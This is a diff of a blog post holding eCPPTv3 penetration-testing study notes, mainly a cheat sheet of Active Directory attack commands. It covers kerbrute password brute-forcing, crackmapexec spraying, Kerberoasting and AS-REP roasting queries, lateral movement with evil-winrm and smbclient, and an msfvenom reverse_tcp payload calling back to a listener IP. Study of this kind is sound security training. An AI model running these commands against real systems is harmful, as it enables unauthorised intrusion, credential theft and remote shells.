@@ -1,6 +1,6 @@
 ---
 title: Certified Professional Penetration Tester (eCPPTv3) - INE 
-description: eCPPTv2 Certification
+description: eCPPTv3 Certification
 slug: INE
 date: 2025-01-28
 #image: cover.jpg
@@ -89,49 +89,28 @@ https://orange-cyberdefense.github.io/ocd-mindmaps/
 {{</callout>}}
 
 ## Table of useful command
-
-| **`kerbrute`** | Enumerate
-brute force/password spray | `Enumeration`: *kerbrute userenum -d example.local --dc 192.168.1.10 users.txt*
-
-`BruteForce`: *kerbrute bruteuser -d example.local --dc 192.168.1.10 administrator passwords.txt*
-
-*users.txt* file with user list |
 | --- | --- | --- |
-| **`crackmapexec`**
-[https://www.youtube.com/watch?v=uLNpR3AnE-Y&list=PLbK3lpDL_g6ChnJ9E8LB30dezPfuzgaBI&index=2](https://www.youtube.com/watch?v=uLNpR3AnE-Y&list=PLbK3lpDL_g6ChnJ9E8LB30dezPfuzgaBI&index=2) | Enum hosts
-Enum null sess Enum anony access
+| **`kerbrute`** | Enumerate brute force/password spray | `Enumeration`: *kerbrute userenum -d example.local --dc 192.168.1.10 users.txt* 
+<br>`BruteForce`: *kerbrute bruteuser -d example.local --dc 192.168.1.10 administrator passwords.txt* 
+<br>*users.txt* file with user list |
 
- | `Get password Policy`: *cme <IP> -u ‘user’ -p ‘password” --pass-pol*
-**DO IT BEFORE… THEN TUNE THE Pwd SPARY with policy obtained**
+| **`crackmapexec`** | Enum hosts <br>Enum null sess <br>Enum anony access | `Get password Policy`: *cme <IP> -u ‘user’ -p ‘password” --pass-pol* <br>**DO IT BEFORE… THEN TUNE THE Pwd SPARY with policy obtained** <br>`Username but NO pwd:` *cme smb <dc_ip> -u user.txt - password.txt --no-bruteforce* <br>`Valid Credential:`<br> 
+**Users**: *cme smb <IP> -u <user> -p ‘<password_from_before>’ --users*<br>
+**Account**: *cme smb <IP> -u <user> -p ‘<password_from_before>’ --shares* 
+<br>`Enumeration`: *crackmapexec smb <IP>*
+<br>`Enumeration`: *crackmapexec smb <IP> -u “ p”* `Enumeration`: *crackmapexec smb <IP> -u ‘a’ -p”*
+<br>`Lateral Movement`: *crackmapexec smb <IP> -u <user> -p <password> -d <domain>* |
 
-`Username but NO pwd:` *cme smb <dc_ip> -u user.txt - password.txt --no-bruteforce*
-
-`Valid Credential:` 
-**Users**: *cme smb <IP> -u <user> -p ‘<password_from_before>’ --users*
-**Account**: *cme smb <IP> -u <user> -p ‘<password_from_before>’ --shares*
-
-`Enumeration`: *crackmapexec smb <IP>*
-`Enumeration`: *crackmapexec smb <IP> -u “ p”* `Enumeration`: *crackmapexec smb <IP> -u ‘a’ -p”*
-
-`Lateral Movement`: *crackmapexec smb <IP> -u <user> -p <password> -d <domain>* |
 | **`evil-winrm`** | Access to target machine | `Lateral Movement`: *evil-winrm -i 192.168.1.100 -u Administrator -p 'Password123'* |
 | **`xfreerdp`** | Access to target machine | `Lateral Movement`: *xfreerdp /v:192.168.1.100 /u:Administrator /p:'Password123'* |
-| **`smbclient`**
- | accedere a risorse SMB/CIFS | `Lateral Movement`: [smbclient.py](http://smbclient.py) <domain>/<user>:<Password123>@<IP>
-
-*smbclient -L //<dc_ip>/* |
-| **`Enter-PSSession`** | Start interactive session | *Enter-PSSession <domain>
-Enter-PSSession seclogs.resesarch.security.local* |
-| **`net`** | Useful for policy settings | *net accounts
-net user administrator* |
-| **`runas`** | Access to victim | *runas.exe /user:administrator cmd*
-[runas.exe /user:administrator cmd](https://www.notion.so/runas-exe-user-administrator-cmd-1196583d22bc80a1a689d2576e37705d?pvs=21)  |
-| **`PowerView`** | Enumeration AD - Powersploit suite | `AS-REP Roasting primary step`: *Get-DomainUser | Where-Object { $_.UserAccountControl -like "*DONT_REQ_PREAUTH*" }*
+| **`smbclient`** | access to SMB/CIFS resource | `Lateral Movement`: [smbclient.py](http://smbclient.py) <domain>/<user>:<Password123>@<IP>
+<br> *smbclient -L //<dc_ip>/* |
+| **`Enter-PSSession`** | Start interactive session | *Enter-PSSession <domain> <br> Enter-PSSession seclogs.resesarch.security.local* |
+| **`net`** | Useful for policy settings | *net accounts net user administrator* |
+| **`runas`** | Access to victim | *runas.exe /user:administrator cmd* [runas.exe /user:administrator cmd](https://www.notion.so/runas-exe-user-administrator-cmd-1196583d22bc80a1a689d2576e37705d?pvs=21)  |
+| **`PowerView`** | Enumeration AD - Powersploit suite | `AS-REP Roasting primary step`: <br>*Get-DomainUser | Where-Object { $_.UserAccountControl -like "*DONT_REQ_PREAUTH*" }*
 **[**Command:**](https://www.notion.so/Command-10c6583d22bc8002a34fe43b85bac6d6?pvs=21)** 
-
-`AD-Kerberoasting`: *Get-NetUser | Where-Object {$_.servicePrincipalName} | fl
-setspn -T research -Q */**
-**[**Command:**](https://www.notion.so/Command-10c6583d22bc80c694fdc162e0fccd8f?pvs=21)**  |
+<br>`AD-Kerberoasting`: *Get-NetUser | Where-Object {$_.servicePrincipalName} | fl setspn -T research -Q */** **[**Command:**](https://www.notion.so/Command-10c6583d22bc80c694fdc162e0fccd8f?pvs=21)**  |
 | **`winpeas`** | Identify misconfigurations, permissions, and vulnerabilities that could be exploited to gain elevated privileges | `Privilefge esclation:` *winpeas.exe* |
 | **`msfvenom`** | Used to generate a reverse_tcp payload | *msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.16.5.101 LPORT=4444 -f exe > rTCP.exe
 [**Command:**](https://www.notion.so/Command-f9a04aef68a348318f1741f6ac6dce2f?pvs=21)*  |
